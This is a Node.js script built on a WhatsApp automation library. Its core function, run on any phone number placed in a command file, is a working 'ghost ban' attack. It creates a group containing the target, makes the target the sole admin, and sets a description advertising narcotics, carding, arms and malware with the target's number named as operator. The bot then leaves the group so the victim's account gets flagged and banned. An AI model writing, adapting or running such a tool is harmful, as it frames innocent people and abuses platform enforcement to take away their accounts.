const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    DisconnectReason,
    Browsers,
    delay
} = require("@whiskeysockets/baileys"); 
const pino = require("pino");
const fs = require("fs");

const sessionPath = './session_new';
let sock = null;
let pairingCodeRequested = false;
let isShuttingDown = false;
let isExecutingBan = false;

function cleanSession() {
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
        console.log(`[✓] Cleaned old session`);
    }
}

// ========== BAN COMMAND WATCHER ==========
const BAN_COMMAND_FILE = './ban_command.json';
const BAN_RESULT_FILE = './ban_result.json';

async function executeBanCommand(targetNumber) {
    if (!sock || isExecutingBan) {
        return { success: false, error: "Socket not ready or busy" };
    }
    
    isExecutingBan = true;
    const targetJid = targetNumber + "@s.whatsapp.net";
    const botJid = sock.user.id;
    
    try {
        // Create group
        const group = await sock.groupCreate("GHOST BAN TRAP", [botJid, targetJid]);
        const groupJid = group.id;
        console.log("[✓] Group created: " + groupJid);
        
        await delay(2000);
        
        // Promote target
        await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
        console.log("[✓] Target promoted");
        
        await delay(1500);
        
        // Demote bot
        await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
        console.log("[✓] Bot demoted");
        
        await delay(1500);
        
        // Update description
        const desc = `⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** ${targetNumber}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.`;
        await sock.groupUpdateDescription(groupJid, desc);
        console.log("[✓] Description updated");
        
        await delay(1500);
        
        // Update profile picture if exists
        if (fs.existsSync("ghost_ban_profile.jpg")) {
            const pic = fs.readFileSync("ghost_ban_profile.jpg");
            await sock.updateProfilePicture(groupJid, pic);
            console.log("[✓] Profile picture updated");
        }
        
        await delay(1500);
        
        // Leave group
        await sock.groupLeave(groupJid);
        console.log("[✓] Bot left group");
        console.log("BAN_COMPLETE");
        
        isExecutingBan = false;
        return { success: true, message: "Trap group created successfully" };
        
    } catch (err) {
        console.log("ERROR: " + err.message);
        isExecutingBan = false;
        return { success: false, error: err.message };
    }
}

function watchForBanCommands() {
    setInterval(async () => {
        if (!fs.existsSync(BAN_COMMAND_FILE) || isExecutingBan) return;
        
        try {
            const cmd = JSON.parse(fs.readFileSync(BAN_COMMAND_FILE, 'utf8'));
            if (!cmd.targetNumber) {
                fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify({ success: false, error: "No target number" }));
                fs.unlinkSync(BAN_COMMAND_FILE);
                return;
            }
            
            console.log(`[i] Received ban command for: ${cmd.targetNumber}`);
            const result = await executeBanCommand(cmd.targetNumber);
            fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify(result));
            fs.unlinkSync(BAN_COMMAND_FILE);
            
        } catch (err) {
            console.error("[!] Ban command error:", err.message);
            fs.writeFileSync(BAN_RESULT_FILE, JSON.stringify({ success: false, error: err.message }));
            if (fs.existsSync(BAN_COMMAND_FILE)) fs.unlinkSync(BAN_COMMAND_FILE);
        }
    }, 1000);
}

async function connectToWhatsApp(isFirstConnect = true) {
    if (isFirstConnect) {
        cleanSession();
    }
    
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    
    const { version } = await fetchLatestBaileysVersion();
    console.log(`[i] Using WA v${version.join(".")}`);

    sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Chrome"),
        syncFullHistory: false,
        markOnlineOnConnect: true,
        printQRInTerminal: false,
        connectTimeoutMs: 120000,
        keepAliveIntervalMs: 30000,
        defaultQueryTimeoutMs: 60000
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (isShuttingDown) return;
        
        if (qr && !pairingCodeRequested && !sock.authState.creds.registered) {
            pairingCodeRequested = true;
            const phoneNumber = process.argv[2]?.replace(/\D/g, '');
            
            if (!phoneNumber || phoneNumber.length < 10) {
                console.error("[x] Error: Provide phone number with country code");
                return;
            }

            console.log(`[i] Requesting pairing code for: ${phoneNumber}`);
            await delay(2000);
            
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                console.log(`ANON_CODE_START:${code}:ANON_CODE_END`);
                fs.writeFileSync('CODE.txt', code);
                console.log("[i] Enter this code on your phone NOW...");
                
            } catch (err) {
                console.error("[✗] Failed to get pairing code:", err.message);
                pairingCodeRequested = false;
            }
        }

        if (connection === "open") {
            console.log("\n[✓] SUCCESS: DEVICE LINKED!");
            console.log(`[i] Device is now ACTIVE and ONLINE`);
            console.log("[i] Press CTRL+C to stop and disconnect\n");
            
            // Start watching for ban commands
            watchForBanCommands();
            
            // KEEP ALIVE ONLY
            while (!isShuttingDown) {
                await delay(60000);
                try { 
                    await sock.sendPresenceUpdate('available'); 
                } catch (e) {}
            }
        }

        if (connection === "close") {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            console.log(`[i] Connection closed. Status: ${statusCode}`);

            if (statusCode === 515 || statusCode === DisconnectReason.restartRequired) {
                console.log("[i] 515: Server restart required. Reconnecting...");
                await delay(3000);
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 405) {
                console.log("[!] 405: Not ready. Retrying...");
                await delay(3000);
                pairingCodeRequested = false;
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 408) {
                console.log("[!] 408: Timeout. Retrying...");
                await delay(3000);
                return connectToWhatsApp(false);
            }
            
            if (statusCode === 428) {
                console.log("[!] 428: Closed early. Retrying...");
                await delay(3000);
                pairingCodeRequested = false;
                return connectToWhatsApp(false);
            }
            
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401;
            
            if (shouldReconnect) {
                console.log("[i] Reconnecting to maintain active status...");
                await delay(3000);
                return connectToWhatsApp(false);
            } else {
                console.log("[✗] Logged out or authentication failed");
                process.exit(1);
            }
        }
        
        if (connection === "connecting") {
            console.log("[i] Connecting to WhatsApp...");
        }
    });

    sock.ev.on("error", (err) => {
        console.error("[!] Socket error:", err.message);
    });
}

// Handle graceful shutdown
process.on("SIGINT", async () => {
    if (isShuttingDown) return;
    isShuttingDown = true;
    console.log("\n[!] Shutting down gracefully...");
    console.log("[✓] Disconnected. Goodbye!");
    process.exit(0);
});

process.on("SIGTERM", () => {
    console.log("\n[!] Terminated");
    process.exit(0);
});

(async () => {
    await connectToWhatsApp(true);
})();

